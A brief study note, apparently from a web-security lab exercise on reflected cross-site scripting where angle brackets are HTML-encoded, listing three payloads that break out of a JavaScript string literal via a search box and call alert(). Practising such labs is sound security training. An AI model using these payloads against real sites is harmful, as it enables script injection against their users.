# Reflected XSS into a JavaScript string with angle brackets HTML encoded

- Some useful ways of breaking out of a string literal are(use these payloads in search box):

```jsx
soul';alert(123);'abcd   (my payload) :)
'-alert(document.domain)-'
';alert(document.domain)//
```